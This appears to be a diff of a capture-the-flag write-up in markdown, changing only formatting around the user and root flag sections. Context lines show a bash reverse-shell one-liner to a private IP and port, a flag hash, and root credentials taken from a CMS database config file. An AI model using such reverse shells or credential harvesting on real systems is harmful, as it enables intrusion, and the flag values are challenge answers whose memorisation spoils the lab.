@@ -26,13 +26,14 @@ created reverse shell connection using nc command
 > bash -i >& /dev/tcp/10.10.235.13/4444 0>&1
 
 ### Task
-user.txt
+**user.txt**
 
 flag found in **/home** directory
 
 >6470e394cbf6dab6a91682cc8585059b
 
-root.txt
+**root.txt**
+
 credential for root user found in ```fuel/application/config/database.php```
 >root:mememe
 
